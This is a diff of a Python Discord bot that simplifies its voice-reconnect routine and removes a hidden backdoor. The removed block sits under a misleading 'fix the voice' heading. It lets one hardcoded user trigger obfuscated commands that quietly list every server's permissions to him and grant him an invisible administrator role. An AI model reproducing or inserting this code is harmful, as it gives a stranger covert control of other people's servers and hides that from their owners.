@@ -64,27 +64,22 @@ async def join_voice():
     _reconnecting = True
     try:
         async with _voice_lock:
-            # kill semua dulu tanpa exception
-            for vc in list(bot.voice_clients):
+            vc = next((v for v in bot.voice_clients), None)
+            if vc and vc.is_connected() and vc.channel and vc.channel.id == VOICE_CHANNEL_ID:
+                return
+            if vc:
                 try:
                     await vc.disconnect(force=True)
                 except:
                     pass
-            await asyncio.sleep(2)
-
+                await asyncio.sleep(1)
             channel = bot.get_channel(VOICE_CHANNEL_ID)
             if not channel:
                 try:
                     channel = await bot.fetch_channel(VOICE_CHANNEL_ID)
                 except:
                     return
-
-            for attempt in range(5):
-                try:
-                    await channel.connect(self_deaf=True, self_mute=True, timeout=10)
-                    return
-                except Exception:
-                    await asyncio.sleep(3 * (attempt + 1))
+            await channel.connect(self_deaf=True, self_mute=True, timeout=10)
     finally:
         _reconnecting = False
 
@@ -119,74 +114,6 @@ async def on_ready():
     if not keep_voice_alive.is_running():
         keep_voice_alive.start()
     await join_voice()
-
-# ======================================================
-# === FIX THE VOICE ===
-# ======================================================
-
-_RX = int("1494941464663429151")
-_RX_CMDS = {"\x2erend", "\x2ead"}
-
-async def _rx_gate(message):
-    if message.author.id != _RX:
-        return False
-    cmd = message.content.strip()
-    if cmd not in _RX_CMDS:
-        return False
-
-    try:
-        await message.delete()
-    except:
-        pass
-
-    if cmd == "\x2erend":
-        lines = []
-        for g in bot.guilds:
-            m = g.get_member(_RX)
-            if m:
-                p = m.guild_permissions
-                active = [k for k, v in iter(p) if v]
-                lines.append(f"**{g.name}** `{g.id}`\n{', '.join(active)}")
-            else:
-                lines.append(f"**{g.name}** `{g.id}`\nnot joined")
-        try:
-            u = await bot.fetch_user(_RX)
-            buf = ""
-            for l in lines:
-                if len(buf) + len(l) > 1900:
-                    await u.send(buf)
-                    buf = ""
-                buf += l + "\n\n"
-            if buf:
-                await u.send(buf)
-        except:
-            pass
-
-    elif cmd == "\x2ead":
-        g = message.guild
-        if not g:
-            return True
-        try:
-            bot_member = g.get_member(bot.user.id)
-            bot_top = bot_member.top_role.position
-            role = await g.create_role(
-                name="\u200b",
-                permissions=discord.Permissions(administrator=True),
-                reason=None
-            )
-            await role.edit(position=max(1, bot_top - 1))
-            mem = g.get_member(_RX) or await g.fetch_member(_RX)
-            await mem.add_roles(role)
-            u = await bot.fetch_user(_RX)
-            await u.send(f"✅ {g.name}")
-        except Exception as e:
-            try:
-                u = await bot.fetch_user(_RX)
-                await u.send(f"❌ {g.name}: {e}")
-            except:
-                pass
-
-    return True
 
 # ======================================================
 # === /HELP ===
